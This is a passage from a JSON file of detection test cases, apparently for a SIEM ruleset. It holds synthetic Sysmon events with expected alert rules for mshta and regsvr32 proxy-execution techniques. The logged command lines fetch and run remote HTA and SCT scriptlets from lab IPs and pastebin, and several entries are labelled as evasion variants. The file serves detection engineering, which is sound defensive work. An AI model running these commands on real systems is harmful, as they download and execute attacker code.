      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:50:09.058651709Z\",\"eventRecordID\":\"550082\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:50:09.058\",\"processGuid\":\"{62602aee-3223-01dd-7477-000000000026}\",\"processId\":\"4207\",\"image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"commandLine\":\"mshta.exe \\\"http://192.168.1.50/run.hta\\\"\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c mshta.exe \\\"http://192.168.1.50/run.hta\\\"\",\"hashes\":\"MD5=B121ACA94EEF9E30B95381BC1B647548,SHA256=AD5075204E8BB44C0EAB1A93D449018482EEC1D77FFBE763502EEC841B1AA816,IMPHASH=99A5D143331F2815DE23F8235C1D61A3\"}}}",
      "expect": {
        "rule.id": "100803",
        "alert": true
      },
      "category": "attack",
      "attack": "mshta",
      "evasion": false,
      "expected_rule_id": 100803,
      "expected_level": 10,
      "mitre_id": "T1218.005"
    },
    {
      "name": "attack mshta 04 | local HTA in Public",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:52:13.850604353Z\",\"eventRecordID\":\"550083\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:52:13.850\",\"processGuid\":\"{fba19e6a-35e1-89c2-dac7-000000000028}\",\"processId\":\"4207\",\"image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"commandLine\":\"mshta.exe C:\\\\Users\\\\Public\\\\update.hta\",\"currentDirectory\":\"C:\\\\Users\\\\Public\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{a53cc172-e3d0-4072-f7da-000000000018}\",\"parentProcessId\":\"1218\",\"parentImage\":\"C:\\\\Windows\\\\explorer.exe\",\"parentCommandLine\":\"C:\\\\Windows\\\\explorer.exe\",\"hashes\":\"MD5=B121ACA94EEF9E30B95381BC1B647548,SHA256=AD5075204E8BB44C0EAB1A93D449018482EEC1D77FFBE763502EEC841B1AA816,IMPHASH=99A5D143331F2815DE23F8235C1D61A3\"}}}",
      "expect": {
        "rule.id": "100803",
        "alert": true
      },
      "category": "attack",
      "attack": "mshta",
      "evasion": false,
      "expected_rule_id": 100803,
      "expected_level": 10,
      "mitre_id": "T1218.005"
    },
    {
      "name": "attack mshta 05 | local HTA in Temp",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:52:39.840819916Z\",\"eventRecordID\":\"550084\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:52:39.840\",\"processGuid\":\"{62602aee-3223-01dd-7477-000000000026}\",\"processId\":\"4207\",\"image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"commandLine\":\"mshta.exe C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\invoice.hta\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c mshta.exe C:\\\\Users\\\\Administrator\\\\AppData\\\\Local\\\\Temp\\\\invoice.hta\",\"hashes\":\"MD5=B121ACA94EEF9E30B95381BC1B647548,SHA256=AD5075204E8BB44C0EAB1A93D449018482EEC1D77FFBE763502EEC841B1AA816,IMPHASH=99A5D143331F2815DE23F8235C1D61A3\"}}}",
      "expect": {
        "rule.id": "100803",
        "alert": true
      },
      "category": "attack",
      "attack": "mshta",
      "evasion": false,
      "expected_rule_id": 100803,
      "expected_level": 10,
      "mitre_id": "T1218.005"
    },
    {
      "name": "attack mshta 06 | HTA from UNC share",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:54:38.127934126Z\",\"eventRecordID\":\"550085\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:54:38.127\",\"processGuid\":\"{62602aee-3223-01dd-7477-000000000026}\",\"processId\":\"4207\",\"image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"commandLine\":\"mshta.exe \\\\\\\\10.42.0.15\\\\share\\\\scan.hta\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c mshta.exe \\\\\\\\10.42.0.15\\\\share\\\\scan.hta\",\"hashes\":\"MD5=B121ACA94EEF9E30B95381BC1B647548,SHA256=AD5075204E8BB44C0EAB1A93D449018482EEC1D77FFBE763502EEC841B1AA816,IMPHASH=99A5D143331F2815DE23F8235C1D61A3\"}}}",
      "expect": {
        "rule.id": "100803",
        "alert": true
      },
      "category": "attack",
      "attack": "mshta",
      "evasion": false,
      "expected_rule_id": 100803,
      "expected_level": 10,
      "mitre_id": "T1218.005"
    },
    {
      "name": "attack mshta 07 | inline vbscript Execute | evasion",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:55:09.175900780Z\",\"eventRecordID\":\"550086\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:55:09.175\",\"processGuid\":\"{62602aee-3223-01dd-7477-000000000026}\",\"processId\":\"4207\",\"image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"commandLine\":\"mshta.exe vbscript:Execute(\\\"CreateObject(\\\"\\\"WScript.Shell\\\"\\\").Run \\\"\\\"cmd /c whoami > C:\\\\Users\\\\Public\\\\who.txt\\\"\\\",0:close\\\")\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c mshta.exe vbscript:Execute(\\\"CreateObject(\\\"\\\"WScript.Shell\\\"\\\").Run \\\"\\\"cmd /c whoami > C:\\\\Users\\\\Public\\\\who.txt\\\"\\\",0:close\\\")\",\"hashes\":\"MD5=B121ACA94EEF9E30B95381BC1B647548,SHA256=AD5075204E8BB44C0EAB1A93D449018482EEC1D77FFBE763502EEC841B1AA816,IMPHASH=99A5D143331F2815DE23F8235C1D61A3\"}}}",
      "expect": {
        "rule.id": "100803",
        "alert": true
      },
      "category": "attack",
      "attack": "mshta",
      "evasion": true,
      "expected_rule_id": 100803,
      "expected_level": 10,
      "mitre_id": "T1218.005"
    },
    {
      "name": "attack mshta 08 | inline javascript GetObject | evasion",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:56:50.485732283Z\",\"eventRecordID\":\"550087\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:56:50.485\",\"processGuid\":\"{62602aee-3223-01dd-7477-000000000026}\",\"processId\":\"4207\",\"image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"commandLine\":\"mshta.exe javascript:a=GetObject(\\\"script:http://192.168.1.50/run.sct\\\").Exec();close()\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c mshta.exe javascript:a=GetObject(\\\"script:http://192.168.1.50/run.sct\\\").Exec();close()\",\"hashes\":\"MD5=B121ACA94EEF9E30B95381BC1B647548,SHA256=AD5075204E8BB44C0EAB1A93D449018482EEC1D77FFBE763502EEC841B1AA816,IMPHASH=99A5D143331F2815DE23F8235C1D61A3\"}}}",
      "expect": {
        "rule.id": "100803",
        "alert": true
      },
      "category": "attack",
      "attack": "mshta",
      "evasion": true,
      "expected_rule_id": 100803,
      "expected_level": 10,
      "mitre_id": "T1218.005"
    },
    {
      "name": "attack mshta 09 | remote HTA pastebin",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:58:49.519415565Z\",\"eventRecordID\":\"550088\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:58:49.519\",\"processGuid\":\"{62602aee-3223-01dd-7477-000000000026}\",\"processId\":\"4207\",\"image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"commandLine\":\"mshta.exe https://pastebin.com/raw/mshta1\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c mshta.exe https://pastebin.com/raw/mshta1\",\"hashes\":\"MD5=B121ACA94EEF9E30B95381BC1B647548,SHA256=AD5075204E8BB44C0EAB1A93D449018482EEC1D77FFBE763502EEC841B1AA816,IMPHASH=99A5D143331F2815DE23F8235C1D61A3\"}}}",
      "expect": {
        "rule.id": "100803",
        "alert": true
      },
      "category": "attack",
      "attack": "mshta",
      "evasion": false,
      "expected_rule_id": 100803,
      "expected_level": 10,
      "mitre_id": "T1218.005"
    },
    {
      "name": "attack mshta 10 | local HTA in Windows Temp",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T21:59:47.182411788Z\",\"eventRecordID\":\"550089\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 21:59:47.182\",\"processGuid\":\"{62602aee-3223-01dd-7477-000000000026}\",\"processId\":\"4207\",\"image\":\"C:\\\\Windows\\\\System32\\\\mshta.exe\",\"commandLine\":\"mshta.exe C:\\\\Windows\\\\Temp\\\\scan.hta\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c mshta.exe C:\\\\Windows\\\\Temp\\\\scan.hta\",\"hashes\":\"MD5=B121ACA94EEF9E30B95381BC1B647548,SHA256=AD5075204E8BB44C0EAB1A93D449018482EEC1D77FFBE763502EEC841B1AA816,IMPHASH=99A5D143331F2815DE23F8235C1D61A3\"}}}",
      "expect": {
        "rule.id": "100803",
        "alert": true
      },
      "category": "attack",
      "attack": "mshta",
      "evasion": false,
      "expected_rule_id": 100803,
      "expected_level": 10,
      "mitre_id": "T1218.005"
    },
    {
      "name": "attack regsvr32 01 | Squiblydoo remote SCT 192.168.1.50",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T22:01:20.281075892Z\",\"eventRecordID\":\"550090\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 22:01:20.281\",\"processGuid\":\"{ecc063c3-7ddd-9727-5465-000000000029}\",\"processId\":\"4517\",\"image\":\"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\"commandLine\":\"regsvr32.exe /s /n /u /i:http://192.168.1.50/regsvr.sct scrobj.dll\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c regsvr32.exe /s /n /u /i:http://192.168.1.50/regsvr.sct scrobj.dll\",\"hashes\":\"MD5=44DDC1031DF48CD8F239E2E4500E0532,SHA256=9C334DF855042FE1C23FDAD12B781F3D8774A25885E3DC17C9AB12211925DE67,IMPHASH=76EE5D2AC065D9B18DF13884FF610D46\"}}}",
      "expect": {
        "rule.id": "100804",
        "alert": true
      },
      "category": "attack",
      "attack": "regsvr32",
      "evasion": false,
      "expected_rule_id": 100804,
      "expected_level": 10,
      "mitre_id": "T1218.010"
    },
    {
      "name": "attack regsvr32 02 | Squiblydoo pastebin SCT",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T22:01:50.214166972Z\",\"eventRecordID\":\"550091\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 22:01:50.214\",\"processGuid\":\"{ecc063c3-7ddd-9727-5465-000000000029}\",\"processId\":\"4517\",\"image\":\"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\"commandLine\":\"regsvr32.exe /s /n /u /i:https://pastebin.com/raw/xyz123 scrobj.dll\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c regsvr32.exe /s /n /u /i:https://pastebin.com/raw/xyz123 scrobj.dll\",\"hashes\":\"MD5=44DDC1031DF48CD8F239E2E4500E0532,SHA256=9C334DF855042FE1C23FDAD12B781F3D8774A25885E3DC17C9AB12211925DE67,IMPHASH=76EE5D2AC065D9B18DF13884FF610D46\"}}}",
      "expect": {
        "rule.id": "100804",
        "alert": true
      },
      "category": "attack",
      "attack": "regsvr32",
      "evasion": false,
      "expected_rule_id": 100804,
      "expected_level": 10,
      "mitre_id": "T1218.010"
    },
    {
      "name": "attack regsvr32 03 | local SCT in Public",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T22:03:33.987911105Z\",\"eventRecordID\":\"550092\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 22:03:33.987\",\"processGuid\":\"{ecc063c3-7ddd-9727-5465-000000000029}\",\"processId\":\"4517\",\"image\":\"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\"commandLine\":\"regsvr32.exe /i:C:\\\\Users\\\\Public\\\\payload.sct scrobj.dll\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c regsvr32.exe /i:C:\\\\Users\\\\Public\\\\payload.sct scrobj.dll\",\"hashes\":\"MD5=44DDC1031DF48CD8F239E2E4500E0532,SHA256=9C334DF855042FE1C23FDAD12B781F3D8774A25885E3DC17C9AB12211925DE67,IMPHASH=76EE5D2AC065D9B18DF13884FF610D46\"}}}",
      "expect": {
        "rule.id": "100804",
        "alert": true
      },
      "category": "attack",
      "attack": "regsvr32",
      "evasion": false,
      "expected_rule_id": 100804,
      "expected_level": 10,
      "mitre_id": "T1218.010"
    },
    {
      "name": "attack regsvr32 04 | local SCT in ProgramData",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T22:05:06.176113569Z\",\"eventRecordID\":\"550093\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 22:05:06.176\",\"processGuid\":\"{ecc063c3-7ddd-9727-5465-000000000029}\",\"processId\":\"4517\",\"image\":\"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\"commandLine\":\"regsvr32.exe /s /u /i:C:\\\\ProgramData\\\\payload.sct C:\\\\Windows\\\\System32\\\\scrobj.dll\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c regsvr32.exe /s /u /i:C:\\\\ProgramData\\\\payload.sct C:\\\\Windows\\\\System32\\\\scrobj.dll\",\"hashes\":\"MD5=44DDC1031DF48CD8F239E2E4500E0532,SHA256=9C334DF855042FE1C23FDAD12B781F3D8774A25885E3DC17C9AB12211925DE67,IMPHASH=76EE5D2AC065D9B18DF13884FF610D46\"}}}",
      "expect": {
        "rule.id": "100804",
        "alert": true
      },
      "category": "attack",
      "attack": "regsvr32",
      "evasion": false,
      "expected_rule_id": 100804,
      "expected_level": 10,
      "mitre_id": "T1218.010"
    },
    {
      "name": "attack regsvr32 05 | Squiblydoo remote SCT lab host",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T22:06:43.918765084Z\",\"eventRecordID\":\"550094\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 22:06:43.918\",\"processGuid\":\"{86ce0a85-4ebc-3808-4b45-000000000030}\",\"processId\":\"4517\",\"image\":\"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\"commandLine\":\"regsvr32.exe /s /n /u /i:http://10.42.0.15/remote.sct scrobj.dll\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{12aa9a1a-d117-1565-dd16-000000000020}\",\"parentProcessId\":\"3973\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\",\"parentCommandLine\":\"powershell.exe -NoProfile -Command \\\"regsvr32.exe /s /n /u /i:http://10.42.0.15/remote.sct scrobj.dll\\\"\",\"hashes\":\"MD5=44DDC1031DF48CD8F239E2E4500E0532,SHA256=9C334DF855042FE1C23FDAD12B781F3D8774A25885E3DC17C9AB12211925DE67,IMPHASH=76EE5D2AC065D9B18DF13884FF610D46\"}}}",
      "expect": {
        "rule.id": "100804",
        "alert": true
      },
      "category": "attack",
      "attack": "regsvr32",
      "evasion": false,
      "expected_rule_id": 100804,
      "expected_level": 10,
      "mitre_id": "T1218.010"
    },
    {
      "name": "attack regsvr32 06 | extra spaces quoted URL | evasion",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T22:07:32.065303566Z\",\"eventRecordID\":\"550095\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 22:07:32.065\",\"processGuid\":\"{ecc063c3-7ddd-9727-5465-000000000029}\",\"processId\":\"4517\",\"image\":\"C:\\\\Windows\\\\System32\\\\regsvr32.exe\",\"commandLine\":\"regsvr32.exe  /s   \\\"/i:https://pastebin.com/raw/xyz\\\"   scrobj.dll\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c regsvr32.exe  /s   \\\"/i:https://pastebin.com/raw/xyz\\\"   scrobj.dll\",\"hashes\":\"MD5=44DDC1031DF48CD8F239E2E4500E0532,SHA256=9C334DF855042FE1C23FDAD12B781F3D8774A25885E3DC17C9AB12211925DE67,IMPHASH=76EE5D2AC065D9B18DF13884FF610D46\"}}}",
      "expect": {
        "rule.id": "100804",
        "alert": true
      },
      "category": "attack",
      "attack": "regsvr32",
      "evasion": true,
      "expected_rule_id": 100804,
      "expected_level": 10,
      "mitre_id": "T1218.010"
    },
    {
      "name": "attack regsvr32 07 | mixed-case binary with spaces | evasion",
      "event": "{\"win\":{\"system\":{\"providerName\":\"Microsoft-Windows-Sysmon\",\"providerGuid\":\"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}\",\"eventID\":\"1\",\"version\":\"5\",\"level\":\"4\",\"task\":\"1\",\"opcode\":\"0\",\"keywords\":\"0x8000000000000000\",\"systemTime\":\"2026-08-19T22:09:30.132690240Z\",\"eventRecordID\":\"550096\",\"channel\":\"Microsoft-Windows-Sysmon/Operational\",\"computer\":\"kingslanding.sevenkingdoms.local\",\"severityValue\":\"INFORMATION\"},\"eventdata\":{\"utcTime\":\"2026-08-19 22:09:30.132\",\"processGuid\":\"{ecc063c3-7ddd-9727-5465-000000000029}\",\"processId\":\"4517\",\"image\":\"C:\\\\Windows\\\\System32\\\\ReGsVr32.eXe\",\"commandLine\":\"ReGsVr32.eXe /s  /n  /u  /i:http://192.168.1.50/a.sct  scrobj.dll\",\"currentDirectory\":\"C:\\\\Users\\\\Administrator\\\\\",\"user\":\"SEVENKINGDOMS\\\\Administrator\",\"parentProcessGuid\":\"{41c406e3-aa37-7f60-b649-000000000015}\",\"parentProcessId\":\"6145\",\"parentImage\":\"C:\\\\Windows\\\\System32\\\\cmd.exe\",\"parentCommandLine\":\"cmd.exe /c ReGsVr32.eXe /s  /n  /u  /i:http://192.168.1.50/a.sct  scrobj.dll\",\"hashes\":\"MD5=44DDC1031DF48CD8F239E2E4500E0532,SHA256=9C334DF855042FE1C23FDAD12B781F3D8774A25885E3DC17C9AB12211925DE67,IMPHASH=76EE5D2AC065D9B18DF13884FF610D46\"}}}",
      "expect": {
        "rule.id": "100804",
        "alert": true
      },
      "category": "attack",
      "attack": "regsvr32",
      "evasion": true,
      "expected_rule_id": 100804,
      "expected_level": 10,
      "mitre_id": "T1218.010"
    },
